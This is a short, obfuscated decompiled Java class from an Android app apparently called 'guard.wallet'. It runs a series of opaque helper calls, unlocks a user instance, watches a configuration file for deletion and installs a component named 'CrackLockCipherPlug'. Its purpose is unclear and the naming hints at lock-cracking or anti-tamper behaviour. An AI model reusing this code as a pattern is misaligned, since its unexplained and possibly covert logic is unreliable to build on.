package w;

import a1.q;
import com.guard.wallet.MainApplication;
import com.guard.wallet.plug.c;
import com.guard.wallet.utils.g;
import com.guard.wallet.utils.h;
import j.e;
import java.util.concurrent.locks.ReentrantLock;

public abstract class b {
   public static final ReentrantLock a = new ReentrantLock();

   public static void a() {
      ReentrantLock var0 = a;
      if (var0.tryLock()) {
         if (w.a.a()) {
            var0.unlock();
            return;
         }

         try {
            if (MainApplication.getInstance() != null) {
               g.k1();
               g.W0();
               g.c1();
               g.l1();
               g.b1();
               g.j1();
               g.h1();
               g.i1();
               g.m1();
               g.e1();
               if (!MainApplication.getInstance().isUserUnlockedInstance() && h.s()) {
                  MainApplication.getInstance().unlockedInstance();
               }

               if (MainApplication.getInstance().getConfigFileDeleteObserver() == null) {
                  String var3 = g.i0();
                  e var2 = new e(26);
                  y.b var1 = new y.b(var3, var2);
                  MainApplication.getInstance().setConfigFileDeleteObserver(var1);
                  var1.startWatching();
               }

               if (MainApplication.getInstance().getCrackLockCipherPlug() == null) {
                  MainApplication var5 = MainApplication.getInstance();
                  c var6 = new c();
                  var5.setCrackLockCipherPlug(var6);
               }
            }
         } catch (Exception var4) {
            q.s("w.b", var4);
         }

         var0.unlock();
      }
   }
}
